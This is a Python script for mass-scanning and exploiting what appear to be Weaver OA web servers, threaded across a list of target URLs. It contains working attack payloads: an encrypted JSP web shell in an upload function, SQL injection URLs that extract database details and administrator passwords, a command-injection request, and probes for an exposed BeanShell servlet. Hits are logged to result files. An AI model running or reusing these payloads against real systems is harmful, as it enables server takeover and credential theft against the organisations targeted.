import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'

#users.data
def exploit_userdata(ip):
    try:
        ip=ip+'/messager/users.data'
        res=requests.get(ip,timeout=9,verify=False)
        if res.status_code!=200 or len(res.text)==0:
            return
        # if "BeanShell Test Servlet" in res.text: 
        print(ip)
        print(res)
        with file_path/'result'/'userdata.txt'.open( "a+") as file:
            file.write(ip+"\n")
            # print(res.text)

    except Exception as e:
        # print("------",e)
        pass

# bsh.servlet.BshServlet
def exploit_bsh(ip):
    try:
        ip=ip+'/weaver/bsh.servlet.BshServlet/'
        res=requests.get(ip,timeout=9,verify=False)
        if res.status_code!=200 or len(res.text)==0:
            return
        if "BeanShell Test Servlet" in res.text: 
            print(ip)
            print(res)
            with file_path/'result'/'bsh.txt'.open("a+") as file:
                file.write(ip+"\n")
            # print(res.text)

    except Exception as e:
        # print("------",e)
        pass

def exploit_upload(ip):
    try:
        files = {
            "file": ("test.jsp", '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>', "application/octet-stream")
        }
        ip=ip+"/page/exportImport/uploadOperation.jsp"
        res=requests.post(ip,timeout=9,verify=False)
        if res.status_code!=200 or len(res.text)!=144 :
            return
        print(ip)
        print(res,len(res.text))
        # print(res.text)
        with file_path/'result'/'upload.txt'.open("a+") as file:
            file.write(ip+"\n")
            # print(res.text)

    except Exception as e:
        # print("------",e)
        pass
def exploit_getSqlData(ip):
    try:
        ip=ip+"/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version"
        res=requests.get(ip,timeout=9,verify=False)
        if res.status_code!=200 or "false" in res.text:
            return
        if "true" in res.text:
            print(ip)
            print(res)
            with file_path/'result'/'getSqlData.txt'.open("a+") as file:
                file.write(ip+"\n")
                # print(res.text)

    except Exception as e:
        # print("------",e)
        pass

def exploit_HrmCareer(ip):
    try:
        ip=ip+"/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7"
        res=requests.get(ip,timeout=9,verify=False)
        if res.status_code!=200 :
            return
        # print(ip)
        # print(res)
        if "登录" in res.text or "忘记密码" in res.text or "login" in res.text or "0x" not in res.text: 
            return
        print(ip)
        print(res)
        with file_path/'result'/'HrmCareer.txt'.open("a+") as file:
            file.write(ip+"\n")
            # print(res.text)

    except Exception as e:
        # print("------",e)
        pass


def exploit_LoginSSO(ip,index):
    try:
        ip=ip+"/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager"
        res=requests.get(ip,timeout=9,verify=False)
        if res.status_code!=200 or len(res.text)!=144 :
            return
        print(ip)
        print(res,len(res.text))
        # print(res.text)
        with result_path.open("a+") as file:
            file.write(ip+"\n")
            # print(res.text)

    except Exception as e:
        # print("------",e)
        pass

def exploit(ip_, index):
    try:

        url = ip_+'downloader.php?file=%3Bpwd%00.zip'
        # print(index,url)
        res = requests.get(url, headers=headers, timeout=8, verify=False)
        print(res, len(res.text))
        print(index,ip_)
        # with result_path.open('a+') as file:
            # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass

# url=''
# exploit(url,1)


threads = []
with open(r'D:\Downloads\tmp\LoginSSO.txt', 'r') as file:
    # with result_path.open('a+') as file:
    urls = []
    for index, line in enumerate(file):
        start = 40
        end = start+40

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit_LoginSSO, args=(ip, index,))
            threads.append(thread)
pool_size = 30
# print(urls)

test = 't'


if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()